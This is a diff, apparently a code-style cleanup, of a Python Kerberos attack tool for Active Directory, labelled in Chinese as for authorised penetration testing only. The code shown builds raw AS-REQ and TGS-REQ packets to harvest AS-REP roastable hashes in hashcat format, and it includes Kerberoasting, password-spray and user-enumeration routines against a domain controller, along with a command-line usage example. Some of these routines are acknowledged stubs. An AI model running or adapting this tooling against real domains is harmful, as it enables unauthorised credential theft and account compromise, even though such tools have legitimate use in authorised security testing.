@@ -12,26 +12,28 @@ ATT&CK Techniques:
 
 注意: 仅用于授权的渗透测试和安全研究
 """
+
 import logging
 
 logger = logging.getLogger(__name__)
 
-import socket
-import struct
-import os
+import base64
 import hashlib
 import hmac
-import time
+import os
 import secrets
-from typing import Dict, List, Optional, Any, Tuple
+import socket
+import struct
+import time
 from dataclasses import dataclass, field
 from datetime import datetime, timedelta
 from enum import IntEnum
-import base64
+from typing import Any, Dict, List, Optional, Tuple
 
 
 class KerberosMessageType(IntEnum):
     """Kerberos消息类型"""
+
     AS_REQ = 10
     AS_REP = 11
     TGS_REQ = 12
@@ -43,6 +45,7 @@ class KerberosMessageType(IntEnum):
 
 class KerberosEncType(IntEnum):
     """Kerberos加密类型"""
+
     DES_CBC_CRC = 1
     DES_CBC_MD4 = 2
     DES_CBC_MD5 = 3
@@ -53,6 +56,7 @@ class KerberosEncType(IntEnum):
 
 class KerberosErrorCode(IntEnum):
     """Kerberos错误码"""
+
     KDC_ERR_NONE = 0
     KDC_ERR_NAME_EXP = 1
     KDC_ERR_SERVICE_EXP = 2
@@ -70,11 +74,12 @@ class KerberosErrorCode(IntEnum):
 @dataclass
 class KerberosTicket:
     """Kerberos票据"""
+
     username: str
     spn: str
     enc_type: int
     cipher: bytes
-    ticket_data: bytes = b''
+    ticket_data: bytes = b""
 
     def to_hashcat(self) -> str:
         """
@@ -111,6 +116,7 @@ class KerberosTicket:
 @dataclass
 class ASREPHash:
     """AS-REP Hash (不需要预认证的用户)"""
+
     username: str
     realm: str
     enc_type: int
@@ -133,6 +139,7 @@ class ASREPHash:
 @dataclass
 class AttackResult:
     """攻击结果"""
+
     success: bool
     attack_type: str
     target: str
@@ -147,7 +154,7 @@ class AttackResult:
             "target": self.target,
             "hash_count": len(self.hashes),
             "hashes": self.hashes,
-            "error": self.error
+            "error": self.error,
         }
 
 
@@ -174,16 +181,16 @@ class KerberosClient:
             sock.connect((self.dc_ip, self.KERBEROS_PORT))
 
             # Kerberos over TCP需要4字节长度前缀
-            length = struct.pack('>I', len(data))
+            length = struct.pack(">I", len(data))
             sock.send(length + data)
 
             # 接收响应
             response_len_data = sock.recv(4)
             if len(response_len_data) < 4:
-                return b''
+                return b""
 
-            response_len = struct.unpack('>I', response_len_data)[0]
-            response = b''
+            response_len = struct.unpack(">I", response_len_data)[0]
+            response = b""
             while len(response) < response_len:
                 chunk = sock.recv(response_len - len(response))
                 if not chunk:
@@ -202,9 +209,9 @@ class KerberosClient:
         elif length < 256:
             return bytes([0x81, length])
         elif length < 65536:
-            return bytes([0x82, (length >> 8) & 0xff, length & 0xff])
+            return bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])
         else:
-            return bytes([0x83, (length >> 16) & 0xff, (length >> 8) & 0xff, length & 0xff])
+            return bytes([0x83, (length >> 16) & 0xFF, (length >> 8) & 0xFF, length & 0xFF])
 
     def _encode_int(self, value: int, tag: int = 0x02) -> bytes:
         """编码整数"""
@@ -214,7 +221,7 @@ class KerberosClient:
         result = []
         temp = value
         while temp > 0:
-            result.insert(0, temp & 0xff)
+            result.insert(0, temp & 0xFF)
             temp >>= 8
 
         if result[0] & 0x80:
@@ -222,9 +229,9 @@ class KerberosClient:
 
         return bytes([tag]) + self._encode_length(len(result)) + bytes(result)
 
-    def _encode_string(self, s: str, tag: int = 0x1b) -> bytes:
+    def _encode_string(self, s: str, tag: int = 0x1B) -> bytes:
         """编码字符串 (GeneralString)"""
-        encoded = s.encode('utf-8')
+        encoded = s.encode("utf-8")
         return bytes([tag]) + self._encode_length(len(encoded)) + encoded
 
     def _encode_sequence(self, data: bytes, tag: int = 0x30) -> bytes:
@@ -233,7 +240,7 @@ class KerberosClient:
 
     def _encode_context(self, data: bytes, tag_num: int) -> bytes:
         """编码上下文标签"""
-        tag = 0xa0 | tag_num
+        tag = 0xA0 | tag_num
         return bytes([tag]) + self._encode_length(len(data)) + data
 
     def _encode_principal_name(self, name: str, name_type: int = 1) -> bytes:
@@ -242,8 +249,8 @@ class KerberosClient:
         name_type_enc = self._encode_context(self._encode_int(name_type), 0)
 
         # name-string
-        parts = name.split('/')
-        names_data = b''
+        parts = name.split("/")
+        names_data = b""
         for part in parts:
             names_data += self._encode_string(part)
         names_seq = self._encode_sequence(names_data)
@@ -258,7 +265,7 @@ class KerberosClient:
         realm: str,
         nonce: int,
         enc_types: List[int],
-        till: datetime = None
+        till: datetime = None,
     ) -> bytes:
         """编码KDC-REQ-BODY"""
         if till is None:
@@ -268,7 +275,7 @@ class KerberosClient:
         kdc_options = self._encode_context(bytes([0x03, 0x05, 0x00, 0x50, 0x80, 0x00, 0x00]), 0)
 
         # cname (可选)
-        cname_enc = b''
+        cname_enc = b""
         if cname:
             cname_enc = self._encode_context(self._encode_principal_name(cname, 1), 1)
 
@@ -276,18 +283,20 @@ class KerberosClient:
         realm_enc = self._encode_context(self._encode_string(realm), 2)
 
         # sname
-        sname_type = 2 if '/' in sname else 1  # SPN用NT-SRV-INST
+        sname_type = 2 if "/" in sname else 1  # SPN用NT-SRV-INST
         sname_enc = self._encode_context(self._encode_principal_name(sname, sname_type), 3)
 
         # till
-        till_str = till.strftime('%Y%m%d%H%M%SZ')
-        till_enc = self._encode_context(bytes([0x18]) + self._encode_length(len(till_str)) + till_str.encode(), 5)
+        till_str = till.strftime("%Y%m%d%H%M%SZ")
+        till_enc = self._encode_context(
+            bytes([0x18]) + self._encode_length(len(till_str)) + till_str.encode(), 5
+        )
 
         # nonce
         nonce_enc = self._encode_context(self._encode_int(nonce), 7)
 
         # etype
-        etype_data = b''
+        etype_data = b""
         for et in enc_types:
             etype_data += self._encode_int(et)
         etype_seq = self._encode_sequence(etype_data)
@@ -296,11 +305,7 @@ class KerberosClient:
         body = kdc_options + cname_enc + realm_enc + sname_enc + till_enc + nonce_enc + etype_enc
         return self._encode_sequence(body)
 
-    def build_as_req(
-        self,
-        username: str,
-        enc_types: List[int] = None
-    ) -> bytes:
+    def build_as_req(self, username: str, enc_types: List[int] = None) -> bytes:
         """
         构建AS-REQ消息 (用于AS-REP Roasting)
         不包含预认证数据
@@ -317,7 +322,7 @@ class KerberosClient:
             sname=f"krbtgt/{self.domain}",
             realm=self.domain,
             nonce=nonce,
-            enc_types=enc_types
+            enc_types=enc_types,
         )
 
         # pvno (5)
@@ -330,16 +335,12 @@ class KerberosClient:
         req_body_enc = self._encode_context(req_body, 4)
 
         as_req = pvno + msg_type + req_body_enc
-        as_req = self._encode_sequence(as_req, tag=0x6a)  # AS-REQ application tag
+        as_req = self._encode_sequence(as_req, tag=0x6A)  # AS-REQ application tag
 
         return as_req
 
     def build_tgs_req(
-        self,
-        spn: str,
-        tgt: bytes,
-        session_key: bytes,
-        enc_types: List[int] = None
+        self, spn: str, tgt: bytes, session_key: bytes, enc_types: List[int] = None
     ) -> bytes:
         """
         构建TGS-REQ消息 (用于Kerberoasting)
@@ -358,7 +359,7 @@ class KerberosClient:
             sname=spn,
             realm=self.domain,
             nonce=nonce,
-            enc_types=enc_types
+            enc_types=enc_types,
         )
 
         # pvno (5)
@@ -375,7 +376,7 @@ class KerberosClient:
         req_body_enc = self._encode_context(req_body, 4)
 
         tgs_req = pvno + msg_type + req_body_enc
-        tgs_req = self._encode_sequence(tgs_req, tag=0x6c)  # TGS-REQ application tag
+        tgs_req = self._encode_sequence(tgs_req, tag=0x6C)  # TGS-REQ application tag
 
         return tgs_req
 
@@ -406,7 +407,7 @@ class KerberosClient:
             return False, "Response too short"
 
         # 检查是否为错误响应
-        if data[0] == 0x7e:  # KRB-ERROR
+        if data[0] == 0x7E:  # KRB-ERROR
             # 提取错误码
             error_code = self._extract_error_code(data)
             if error_code == KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED:
@@ -414,7 +415,7 @@ class KerberosClient:
             return False, f"KRB_ERROR: {error_code}"
 
         # AS-REP (tag 0x6b)
-        if data[0] == 0x6b:
+        if data[0] == 0x6B:
             # 提取加密的enc-part
             cipher = self._extract_enc_part(data)
             if cipher:
@@ -422,7 +423,7 @@ class KerberosClient:
                     username=username,
                     realm=self.domain,
                     enc_type=KerberosEncType.RC4_HMAC,  # 假设RC4
-                    cipher=cipher
+                    cipher=cipher,
                 )
                 return True, asrep
 
@@ -433,7 +434,7 @@ class KerberosClient:
         # 简化解析,搜索error-code字段
         for i in range(len(data) - 5):
             # 查找context tag [6] (error-code)
-            if data[i] == 0xa6:
+            if data[i] == 0xA6:
                 if data[i + 2] == 0x02:  # INTEGER
                     length = data[i + 3]
                     if length == 1:
@@ -452,17 +453,17 @@ class KerberosClient:
                 try:
                     length, offset = self._decode_length(data, i + 1)
                     if 50 < length < len(data) - offset:
-                        return data[offset:offset + length]
+                        return data[offset : offset + length]
                 except (ValueError, IndexError):
                     continue
-        return b''
+        return b""
 
     def _decode_length(self, data: bytes, offset: int) -> Tuple[int, int]:
         """解码ASN.1长度"""
         if data[offset] < 128:
             return data[offset], offset + 1
         else:
-            num_bytes = data[offset] & 0x7f
+            num_bytes = data[offset] & 0x7F
             length = 0
             for i in range(num_bytes):
                 length = (length << 8) | data[offset + 1 + i]
@@ -477,12 +478,7 @@ class KerberosAttacker:
     """
 
     def __init__(
-        self,
-        domain: str,
-        dc_ip: str,
-        username: str = "",
-        password: str = "",
-        verbose: bool = False
+        self, domain: str, dc_ip: str, username: str = "", password: str = "", verbose: bool = False
     ):
         self.domain = domain.upper()
         self.dc_ip = dc_ip
@@ -528,10 +524,7 @@ class KerberosAttacker:
                 self._log(f"[-] {username}: {result}")
 
         return AttackResult(
-            success=len(hashes) > 0,
-            attack_type="AS-REP Roasting",
-            target=self.dc_ip,
-            hashes=hashes
+            success=len(hashes) > 0, attack_type="AS-REP Roasting", target=self.dc_ip, hashes=hashes
         )
 
     def kerberoast(self, spns: List[str] = None) -> AttackResult:
@@ -557,7 +550,7 @@ class KerberosAttacker:
                 success=False,
                 attack_type="Kerberoasting",
                 target=self.dc_ip,
-                error="No SPNs provided"
+                error="No SPNs provided",
             )
 
         self._log(f"Kerberoasting {len(spns)} SPNs...")
@@ -577,14 +570,11 @@ class KerberosAttacker:
             success=False,
             attack_type="Kerberoasting",
             target=self.dc_ip,
-            error="Full implementation requires valid TGT (use impacket for complete support)"
+            error="Full implementation requires valid TGT (use impacket for complete support)",
         )
 
     def password_spray(
-        self,
-        usernames: List[str],
-        password: str,
-        delay: float = 0.5
+        self, usernames: List[str], password: str, delay: float = 0.5
     ) -> AttackResult:
         """
         Kerberos密码喷洒
@@ -622,7 +612,7 @@ class KerberosAttacker:
             attack_type="Password Spray",
             target=self.dc_ip,
             hashes=valid_creds,
-            error="Full implementation requires encrypted timestamp pre-auth"
+            error="Full implementation requires encrypted timestamp pre-auth",
         )
 
     def enumerate_users_via_kerberos(self, usernames: List[str]) -> List[str]:
@@ -667,7 +657,7 @@ def kerberos_attack(
     attack_type: str,
     targets: List[str],
     password: str = "",
-    verbose: bool = False
+    verbose: bool = False,
 ) -> Dict[str, Any]:
     """
     Kerberos攻击便捷函数
@@ -698,7 +688,7 @@ def kerberos_attack(
             "attack_type": "User Enumeration",
             "target": dc_ip,
             "valid_users": valid_users,
-            "count": len(valid_users)
+            "count": len(valid_users),
         }
     else:
         return {"error": f"Unknown attack type: {attack_type}"}
@@ -708,12 +698,15 @@ def kerberos_attack(
 
 if __name__ == "__main__":
     import sys
-    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
+
+    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
 
     if len(sys.argv) < 4:
         logger.info("Usage: python kerberos_attack.py <domain> <dc_ip> <attack_type> [targets...]")
         logger.info("Attack types: asrep, kerberoast, spray, enum")
-        logger.info("Example: python kerberos_attack.py contoso.com 192.168.1.1 asrep user1 user2 user3")
+        logger.info(
+            "Example: python kerberos_attack.py contoso.com 192.168.1.1 asrep user1 user2 user3"
+        )
         sys.exit(1)
 
     domain = sys.argv[1]
